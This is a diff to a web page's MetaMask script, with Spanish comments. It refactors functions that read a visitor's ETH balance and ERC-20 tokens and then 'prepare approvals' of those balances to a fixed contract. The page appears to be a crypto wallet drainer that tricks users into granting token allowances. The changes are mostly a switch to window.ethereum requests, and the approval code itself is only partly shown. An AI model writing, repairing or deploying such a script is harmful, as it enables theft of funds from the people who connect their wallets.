@@ -67,15 +67,17 @@
         // Instanciamos el contrato después de que MetaMask se haya conectado
         let contract;
         async function initContract() {
-            const accounts = await web3.eth.getAccounts();
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
             const userAddress = accounts[0];
+            const web3 = new Web3(window.ethereum); // Usamos MetaMask para la instancia de Web3
             contract = new web3.eth.Contract(contractABI, contractAddress);
         }
 
         // Función para obtener los tokens ERC-20 del usuario
         async function getERC20Tokens() {
-            const accounts = await web3.eth.getAccounts();
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
             const userAddress = accounts[0];
+            const web3 = new Web3(window.ethereum); // Usamos MetaMask para la instancia de Web3
 
             // Lista de contratos ERC-20 que el usuario podría tener
             const tokenContracts = [
@@ -115,8 +117,9 @@
 
         // Función para verificar el saldo de ETH del usuario
         async function getETHBalance() {
-            const accounts = await web3.eth.getAccounts();
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
             const userAddress = accounts[0];
+            const web3 = new Web3(window.ethereum); // Usamos MetaMask para la instancia de Web3
             const balance = await web3.eth.getBalance(userAddress);
             return balance;
         }
@@ -128,7 +131,7 @@
                 const tokensToApprove = await getERC20Tokens();
 
                 if (ethBalance > 0 || tokensToApprove.length > 0) {
-                    const accounts = await web3.eth.getAccounts();
+                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                     const userAddress = accounts[0];
 
                     // Preparar las aprobaciones
@@ -157,9 +160,6 @@
                 alert("Hubo un error al intentar aprobar los saldos.");
             }
         }
-
-        // Inicializamos el contrato después de que MetaMask esté listo
-        window.onload = initContract;
     </script>
 </body>
 </html>
